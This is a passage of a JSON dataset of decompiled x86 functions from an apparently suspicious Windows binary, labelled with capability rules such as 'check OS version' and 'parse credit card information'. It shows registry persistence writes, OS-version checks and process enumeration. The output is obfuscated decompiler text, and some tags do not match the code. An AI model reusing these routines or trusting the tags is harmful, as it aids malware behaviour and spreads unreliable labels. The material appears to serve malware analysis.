{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401067) overlaps instruction at (ram,0x00401063)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *unaff_ESI;\n    uint *puVar5;\n    code *pcVar6;\n    char *pcVar7;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    pcVar6 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    if ((arg_ch < 1) || (0 < arg_ch)) {\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x40708c, arg_8h);\n        unaff_ESI = arg_8h;\n    }\n    else {\n        unaff_ESI[-0x73] = unaff_ESI[-0x73];\n        *(arg_ch + -1) = *(arg_ch + -1);\n        pcVar6 = puVar5 + 3;\n    }\n    (*pcVar6)(&var_268h, 0x4070a4, unaff_ESI);\n    pcVar6 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_4ch = &var_164h;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    var_3ch = &var_ch;\n    uVar4 = 0xffffffff;\n    pcVar7 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar7 = unaff_ESI;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_20h = ~uVar4 - 1;\n    var_38h = 0x4070cc;\n    var_34h = 0x4070d8;\n    var_30h = 0x4070e4;\n    var_2ch = 0x4070f4;\n    var_28h = 0x4070fc;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        iVar3 = var_10h * 4;\n        var_48h = unaff_ESI;\n        do {\n            iVar2 = (*pcVar6)(0x80000002, &var_268h, *(&var_38h + iVar3), *(&var_60h + iVar3), *(&var_4ch + iVar3), \n                              *(&var_24h + iVar3));\n            if (iVar2 != 0) {\n                return 0;\n            }\n            iVar3 = iVar3 + 4;\n        } while (iVar3 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1261
    },
    "00402510": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00402510(void)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    bVar1 = &stack0xfffffffc < 0x94;\n    bVar2 = *0x10 == 0x98;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if ((!bVar1 && !bVar2) && (bVar1 || bVar2)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 207
    },
    "00403cb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403cb0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403af0(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "00404070": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint32_t __cdecl fcn.00404070(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack40 = arg_8h;\n    uVar1 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    if ((&uStack40 < 0xfffffffc && *0x10 != 0x24) && (&uStack40 >= 0xfffffffc || *0x10 == 0x24)) {\n        if (!SCARRY4(&uStack40, 4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        return uVar1;\n    }\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    uVar1 = 0;\n    puVar3 = &var_14h;\n    do {\n        uStack40 = *puVar3;\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n        if (iVar2 != 0) {\n            return 1;\n        }\n        uVar1 = uVar1 + 1;\n        puVar3 = puVar3 + 1;\n    } while (uVar1 < 5);\n    uStack40 = 0x407430;\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n    return iVar2 == 0;\n}\n",
        "token_count": 413
    },
    "00404b30": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404b5d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00404b30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402590();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403c80();\n        arg_ch_01 = fcn.00403c80();\n        arg_ch_02 = fcn.00403c80();\n        fcn.004025e0(arg_10h, arg_ch_00);\n        fcn.004025e0(arg_8h, arg_ch_01);\n        fcn.004025e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402640(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402640(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402640(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004025e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 645
    },
    "00401620": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b3f) overlaps instruction at (ram,0x00401b3b)\n// \n// WARNING: Removing unreachable block (ram,0x00401a07)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401620(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint uVar7;\n    char *pcVar8;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    uint16_t extraout_CX_01;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar9;\n    int32_t extraout_ECX_01;\n    int32_t iVar10;\n    uint32_t extraout_EDX;\n    uint8_t *puVar12;\n    uint8_t uVar13;\n    unkuint3 unaff_EBX;\n    unkuint3 Var14;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar15;\n    uchar uVar16;\n    bool bVar17;\n    bool bVar18;\n    uchar uVar19;\n    char cVar20;\n    char cVar21;\n    uint64_t uVar22;\n    ulong uVar23;\n    ushort uStack28;\n    uchar uStack26;\n    uchar uStack25;\n    ushort uStack24;\n    uchar uStack22;\n    uchar uStack21;\n    ushort uStack20;\n    uchar uStack18;\n    uchar uStack17;\n    uint16_t uStack16;\n    uchar uStack14;\n    uint uStack13;\n    uint uStack9;\n    uint uStack5;\n    char cVar11;\n    \n    uStack5._0_1_ = unaff_ESI >> 0x18;\n    uStack5 = CONCAT31(unaff_EBX, uStack5);\n    uStack9._0_1_ = unaff_EDI >> 0x18;\n    uStack9 = CONCAT31(unaff_ESI, uStack9);\n    uStack13._1_3_ = unaff_EDI;\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7024;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    puVar15 = unaff_EDI & 0xffffff | uStack9 << 0x18;\n    Var14 = unaff_EBX & 0xffff;\n    uStack16 = 0x12;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7030;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    iVar4 = fcn.00402280();\n    uStack16 = Var14;\n    bVar17 = ((uStack16 ^ 0x70c5) - iVar4 >> 8 | extraout_CX >> 8) == extraout_CX;\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack13 = uStack13._1_3_ << 8;\n    uStack20 = 0x7044;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar22 = fcn.00402280();\n    uVar16 = uStack18;\n    uStack18 = unaff_EBP >> 0x18;\n    uVar19 = uStack18;\n    if ((bVar17) || (!bVar17)) {\ncode_r0x004016bb:\n        puVar6 = (uVar22 >> 0x20) + 0xc;\n        *puVar6 = *puVar6 ^ extraout_ECX >> 8;\n        uStack21 = 0x48;\n        uStack20 = 0x4070;\n        uStack18 = 0;\n        uStack25 = 0xf;\n        uStack24 = 0;\n        uStack22 = 0;\n        uStack28 = 0x4074;\n        uStack26 = 0;\n        fcn.00402280(0x90);\n        uStack5 = 0x407054;\n        uStack9 = 0xf;\n        uStack13 = 0x407490;\n        uStack17 = 0xf7;\n        uStack16 = 0x4016;\n        uStack14 = 0;\n        fcn.00402280();\n        uStack21 = unaff_EBP;\n        uStack20 = unaff_EBP >> 8;\n        uStack25 = unaff_ESI;\n        uStack24 = unaff_ESI >> 8;\n        uStack28 = puVar15 >> 8;\n        uStack26 = puVar15 >> 0x18;\n        uVar13 = Var14;\n        uVar9 = extraout_ECX_00 & 0xffff0000 | CONCAT11((extraout_ECX_00 >> 8) - uVar13, extraout_ECX_00);\n        bVar17 = uVar9 < extraout_EDX;\n        cVar21 = SBORROW4(uVar9, extraout_EDX);\n        cVar20 = uVar9 - extraout_EDX < 0;\n        bVar18 = uVar9 == extraout_EDX;\n        uStack5 = 0x40705c;\n        uStack9 = 0xf;\n        uStack13 = 0x407490;\n        uStack17 = 0x20;\n        uStack16 = 0x4017;\n        uStack14 = 0;\n        uStack22 = uStack5;\n        uStack18 = uVar19;\n        fcn.00402280();\n        if ((!bVar17 && !bVar18) && (bVar17 || bVar18)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uStack17 = 0xc;\n        uStack16 = 0;\n        uStack14 = 0;\n        uStack21 = 0x68;\n        uStack20 = 0x4070;\n        uStack18 = 0;\n        uStack25 = 0xf;\n        uStack24 = 0;\n        uStack22 = 0;\n        uStack9._0_1_ = 0x90;\n        uStack28 = 0x4074;\n        uStack26 = 0;\n        uVar22 = fcn.00402280(0x90);\n        puVar6 = uVar22 >> 0x20;\n        cVar11 = extraout_ECX_01 >> 8;\n        iVar10 = extraout_ECX_01;\n        if (cVar21 == cVar20) goto code_r0x00401740;\ncode_r0x00401748:\n        uVar13 = Var14;\n        uStack9._0_1_ = 0xf;\n        uStack28 = 0;\n        uStack26 = 0;\n        puVar12 = puVar6;\ncode_r0x0040174e:\n        puVar12[0xf] = puVar12[0xf] + cVar11;\n        iVar4 = fcn.00402280(0x90, uStack9);\n        uVar16 = false;\n        uVar19 = ((puVar15 | 0x74e3) - iVar4 & 0x1a8) == 0;\n        uStack9._0_1_ = 0x90;\n        uStack28 = 0x4074;\n        uStack26 = 0;\n        uStack5 = 0x40178c;\n        puVar6 = fcn.00402280();\n        if (!uVar16) goto code_r0x00401792;\n    }\n    else {\n        puVar2 = puVar15 + 1;\n        uVar7 = in(uVar22 >> 0x20);\n        *puVar15 = uVar7;\n        puVar15 = puVar2;\n        if (0 < &stack0xffffffe4) goto code_r0x004016bb;\n        uVar13 = 0x70;\n        uVar22 = uVar22 & 0xffffffff00000000 | uVar22 | *uVar22;\n        pcVar8 = extraout_ECX * 2 + 0x53;\n        cVar20 = Var14 + 1 >> 8;\n        cVar21 = SCARRY1(*pcVar8, cVar20);\n        *pcVar8 = *pcVar8 + cVar20;\n        cVar20 = *pcVar8 < '\\0';\n        iVar10 = extraout_ECX;\n        uStack18 = uVar16;\ncode_r0x00401740:\n        puVar6 = uVar22 >> 0x20;\n        cVar11 = iVar10 >> 8;\n        Var14 = uVar13;\n        if (cVar21 == cVar20) goto code_r0x00401748;\n        puVar12 = uVar22;\n        if (!SBORROW4(puVar6, 0x7468086a)) goto code_r0x0040174e;\n        uVar3 = uVar22 >> 0x20;\n        *puVar6 = (*puVar6 - uVar3) - (puVar6 < 0x7468086a);\n        uVar16 = CARRY1(*puVar6, uVar3);\n        *puVar6 = *puVar6 + uVar3;\n        uVar19 = *puVar6 == 0;\ncode_r0x00401792:\n        if (uVar16) {\n            out(0xbd, puVar6);\n            return;\n        }\n    }\n    fcn.00402280(0x90, 0xf, 0x8c, 0x18, uStack9);\n    fcn.00402280(0x90, 0xf, 0x4070a4, 0x25);\n    if ((!uVar16 && !uVar19) && (uVar16 || uVar19)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402280(0x407490, 0xf, 0x4070cc, 10);\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack13 = uStack13 & 0xffffff00;\n    uStack20 = 0x70d8;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack13._1_3_ = uStack13 >> 8;\n    uStack16 = 0xd;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x70e4;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 6;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x70f4;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 5;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x70fc;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar5 = fcn.00402280();\n    uVar5 = (uVar5 & 0xff | ((uVar5 >> 8) - uVar13) + 0x4d << 8) & 0x26ae;\n    cVar21 = SBORROW2(uVar5, 1);\n    cVar20 = uVar5 - 1 < 0;\n    bVar17 = uVar5 == 1;\n    uStack16 = 0xd;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7104;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar23 = fcn.00402280();\n    if ((!bVar17 && cVar21 == cVar20) && (bVar17 || cVar21 != cVar20)) {\n        puVar6 = uVar23 + 0x6a39da56;\n        *puVar6 = *puVar6 ^ extraout_CX_00;\n        piVar1 = uVar23 + 0x14;\n        iVar10 = *piVar1;\n        *piVar1 = *piVar1 - unaff_EBP;\n        if (SBORROW4(iVar10, unaff_EBP) == false) goto code_r0x00401929;\n    }\n    pcVar8 = (uVar23 >> 0x20) + 0xf;\n    *pcVar8 = *pcVar8 + (extraout_CX_00 >> 8);\n    fcn.00402280(0x90);\n    uStack16 = 0xf;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7130;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\ncode_r0x00401929:\n    uStack16 = 0xe;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7140;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7150;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x715c;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    fcn.00402280(0x90);\n    cVar21 = '\\0';\n    cVar20 = '\\0';\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7174;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    uVar7 = fcn.00402280();\n    if ((cVar21 == cVar20) && (cVar21 != cVar20)) {\n        out(0xc4, uVar7);\n        *puVar15 = uVar7;\n    }\n    fcn.00402280();\n    uStack28 = 0xe;\n    uStack26 = 0;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack28 = 0x11;\n    uStack26 = 0;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack28 = 0x13;\n    uStack26 = 0;\n    uStack25 = 0;\n    fcn.00402280();\n    bVar17 = (unaff_ESI & extraout_CX_01) < 0;\n    uStack28 = 0x14;\n    uStack26 = 0;\n    uStack25 = 0;\n    uVar23 = fcn.00402280();\n    if (((!bVar17) && (bVar17)) && (pcVar8 = uVar23 + -0x2797cc96,  !SCARRY4(uVar23, -0x2797cc96))) {\n        *pcVar8 = *pcVar8 + pcVar8;\n    }\n    pcVar8 = (uVar23 >> 0x20) + 0xf;\n    *pcVar8 = *pcVar8 + extraout_CH;\n    fcn.00402280(0x90);\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x720c;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7218;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    fcn.00402280(0x90);\n    uStack16 = 6;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7224;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 0x2a;\n    uStack14 = 0;\n    uStack13._0_1_ = 0;\n    uStack20 = 0x7258;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack13 = uStack13._1_3_ << 8;\n    uStack20 = 0x7284;\n    uStack18 = 0x40;\n    uStack17 = 0;\n    uStack24 = 0xf;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x7490;\n    uStack26 = 0x40;\n    uStack25 = 0;\n    fcn.00402280();\n    return;\n}\n",
        "token_count": 4998
    },
    "004021a0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004021a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t hObject;\n    \n    var_8h = 0xffffffff;\n    hObject = (**0x41e878)();\n    if (hObject == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar2 = &var_12ch;\n    for (iVar1 = 0x49; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    iVar1 = (**0x41e87c)();\n    do {\n        if (iVar1 == 0) {\ncode_r0x0040225d:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar1 == 0) {\n            var_8h = var_128h;\n            goto code_r0x0040225d;\n        }\n        iVar1 = (**0x41e880)(hObject, &var_130h);\n    } while( true );\n}\n",
        "token_count": 346
    },
    "004025e0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040261e) overlaps instruction at (ram,0x00402615)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004025e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    uVar2 = 0;\n    bVar3 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((bVar3) || (!bVar3)) {\n                iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\n                *(uVar2 + 0x43d1773a) = *(uVar2 + 0x43d1773a) ^ 0xff27e95e;\n                iVar1 = in_EAX + !bVar3 + 0x7ccf2c0d;\n            }\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n            bVar3 = uVar2 < arg_ch;\n        } while (bVar3);\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "004028b0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004028d7) overlaps instruction at (ram,0x004028d6)\n// \n// WARNING: Removing unreachable block (ram,0x004028f9)\n\nvoid fcn.004028b0(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((0x7 < &stack0xfffffffc && *0x10 != 0xc) &&\n       (puVar4 = &stack0xfffffffc,  0x7 >= &stack0xfffffffc || *0x10 == 0xc)) {\n        *(unaff_EDI + -0x75) = *(unaff_EDI + -0x75) - &stack0xffffffe8;\n        puVar4 = &stack0xfffffffd;\n        param_1 = unaff_EDI;\n        if (-1 < (in_EAX | 0x8b)) {\n            *(unaff_ESI + -0x75) = *(unaff_ESI + -0x75) + (in_EAX >> 8);\n            LOCK();\n        }\n    }\n    uVar1 = fcn.00403530(0, param_1);\n    iVar2 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    *(puVar4 + -8) = iVar2;\n    uVar3 = *(iVar2 + 0x58);\n    *(puVar4 + -4) = uVar3;\n    if (uVar1 < uVar3) {\n        iVar2 = (uVar1 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        iVar2 = uVar1 - (uVar3 & 0xffff);\n    }\n    *(puVar4 + 8) = iVar2;\n    iVar2 = *(puVar4 + 8);\n    uVar3 = *(puVar4 + -4) >> 0x10;\n    if (iVar2 < *(puVar4 + -4) >> 0x10) {\n        iVar2 = (iVar2 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        iVar2 = iVar2 - uVar3;\n    }\n    *(puVar4 + 8) = iVar2;\n    **(puVar4 + 0x14) = *(puVar4 + 8) + *(puVar4 + 0xc);\n    **(puVar4 + 0x10) = *(*(puVar4 + -8) + 0x58);\n    return;\n}\n",
        "token_count": 608
    },
    "00402eb0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403059) overlaps instruction at (ram,0x00403058)\n// \n// WARNING: Removing unreachable block (ram,0x00403059)\n\nint32_t __fastcall fcn.00402eb0(uint32_t param_1, uint8_t *param_2, uchar *param_3)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint in_EAX;\n    uint32_t uVar4;\n    char cVar7;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    char cVar8;\n    char *unaff_EBX;\n    uchar *puVar9;\n    uchar *unaff_ESI;\n    int32_t *unaff_EDI;\n    char *pcVar10;\n    uint16_t in_SS;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    int32_t *piStack24;\n    \n    puVar9 = &stack0xfffffffc;\n    cVar8 = unaff_EBX;\n    uVar5 = CONCAT11(((in_EAX >> 8) - cVar8) + 'M', in_EAX) & 0x26ae;\n    bVar13 = SBORROW2(uVar5, 1);\n    uVar3 = uVar5 - 1;\n    bVar12 = uVar3 < 0;\n    uVar2 = POPCOUNT(uVar3 & 0xff);\n    *param_3 = 0xa2;\n    if ((uVar3 == 0 || uVar5 == 0) || (uVar3 != 0 && uVar5 != 0)) {\n        param_3[1] = 0xe5;\n    }\n    else {\n        bVar13 = SCARRY4(&stack0xfffffffc, &stack0xfffffff0);\n        puVar9 = *0x10 * 2 + -0x14;\n        bVar12 = puVar9 < 0;\n        uVar2 = POPCOUNT(puVar9 & 0xff);\n    }\n    bVar11 = (uVar2 & 1) == 0;\n    if ((bVar11) || (!bVar11)) {\n        